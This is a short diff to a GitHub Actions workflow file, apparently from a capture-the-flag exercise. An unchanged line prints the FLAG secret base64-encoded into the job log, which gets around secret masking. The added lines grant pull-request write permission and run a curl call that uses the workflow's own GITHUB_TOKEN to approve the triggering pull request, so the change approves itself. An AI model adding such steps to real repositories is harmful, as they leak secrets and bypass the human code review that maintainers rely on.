@@ -5,6 +5,8 @@ on:
     branches:
       - "main"
   pull_request:
+permissions:
+  pull-requests: write
 jobs:
   Explore-GitHub-Actions:
     runs-on: ubuntu-latest
@@ -21,4 +23,11 @@ jobs:
           echo "Hello world!"
           echo "${{ secrets.FLAG }}" | base64
           ls ${{ github.workspace }}
+      - name: approve PR?
+        run: |
+         curl --request POST \
+         --url https://api.github.com/repos/${{github.repository}}/pulls/${{github.event.number}}/reviews \
+         --header 'authorization: Bearer ${{ secrets.GITHUB_TOKEN }}' \
+         --header 'content-type: application/json' \
+         -d '{"event":"APPROVE"}'
       - run: echo "🍏 This job's status is ${{ job.status }}."
